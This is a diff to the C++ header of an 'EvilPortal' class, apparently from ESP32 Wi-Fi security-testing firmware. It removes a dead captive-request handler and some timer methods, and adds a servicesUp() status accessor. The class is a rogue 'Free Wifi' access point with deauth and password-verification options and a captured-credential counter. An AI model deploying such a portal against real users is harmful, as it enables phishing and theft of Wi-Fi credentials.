@@ -6,18 +6,13 @@
 #include <globals.h>
 #include <WiFiType.h>
 
+// A CaptiveRequestHandler used to be registered here. Its canHandle() was non-const
+// while AsyncWebHandler's is const, so it never overrode, dispatch always took the
+// base's false, and the handler was skipped for every request (ISSUE-32). Removed
+// rather than const-corrected: webServer.onNotFound() already does the same routing
+// and is the path that has always been live. Restoring the class without also dropping
+// its beginResponseStream() would have activated a 1,460-byte-per-request leak.
 class EvilPortal {
-    class CaptiveRequestHandler : public AsyncWebHandler {
-    public:
-        CaptiveRequestHandler(EvilPortal *portal) : _portal(portal) {}
-        virtual ~CaptiveRequestHandler() { _portal = nullptr; }
-        bool canHandle(AsyncWebServerRequest *request) { return true; }
-        void handleRequest(AsyncWebServerRequest *request);
-
-    private:
-        EvilPortal *_portal;
-    };
-
 public:
     EvilPortal(
         String tssid = "", uint8_t channel = 6, bool deauth = false, bool verifyPwd = false,
@@ -38,6 +33,10 @@ public:
     // which starts the netif and writes the address, so the IP reads back even
     // when the softAP() that follows fails.
     bool apOnAir() { return _apOnAir; }
+    // False after restartWiFi() lost the AP, when DNS and HTTP were deliberately not
+    // rebuilt. apOnAir() alone cannot express that: it says whether the radio came up,
+    // not whether anything is serving on it.
+    bool servicesUp() { return _servicesUp; }
     int getCredentialCount() { return totalCapturedCredentials; }
 
     bool hasCredentials();
@@ -50,13 +49,8 @@ public:
     uint8_t getChannel() { return _channel; }
     bool isBackgroundMode() { return _backgroundMode; }
 
-    void setBaseDuration(uint16_t seconds);
-    void setExtendedDuration(uint16_t seconds);
-    void checkAndExtendDuration();
-    bool hasRecentActivity();
     bool hasRecentPageView();
     void recordPageView();
-    bool shouldTerminate();
 
 private:
     String apName = "Free Wifi";
@@ -97,13 +91,6 @@ private:
     bool _servicesUp = false;
     bool _shutdownDone = false;
 
-    CaptiveRequestHandler *_captiveHandler = nullptr;
-
-    uint16_t _baseDurationSec = 15;
-    uint16_t _extendedDurationSec = 60;
-    unsigned long _lastActivityTime = 0;
-    bool _durationExtended = false;
-    unsigned long _launchTime = 0;
     unsigned long _lastPageViewTime = 0;
 
     void portalController(AsyncWebServerRequest *request);
